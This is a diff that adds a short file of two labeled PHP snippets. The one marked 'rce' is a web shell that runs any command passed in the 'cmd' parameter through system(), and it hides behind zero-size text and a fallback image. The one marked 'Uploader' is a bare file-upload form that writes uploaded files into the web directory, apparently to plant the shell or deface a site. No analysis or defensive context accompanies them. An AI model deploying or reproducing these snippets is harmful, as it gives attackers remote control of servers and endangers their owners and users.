@@ -1,1 +1,12 @@
+rce = 
+
+<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>
+<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="foto.jpg" border=0>
+';}__halt_compiler();?></h1>
+
+
+Uploader = 
+
+<?php if (isset($_POST['submit'])) {$nama = $_FILES['gambar']['name'];$tempat = $_FILES['gambar']['tmp_name'];$type = $_FILES['gambar']['type'];$size = $_FILES['gambar']['size'];$ukuran = ['html', 'jpg', 'png', 'jpeg'];$explode = explode('.', $nama);$pembaginya = strtolower(end($explode));if ( in_array($pembaginya, $ukuran)) {move_uploaded_file($tempat, $nama);}else{echo "duh";}} else { 
+echo '<form method="post" enctype="multipart/form-data"><input type="file" name="gambar"><input type="submit" name="submit" value="submit"></form>'; }__halt_compiler();?>
 
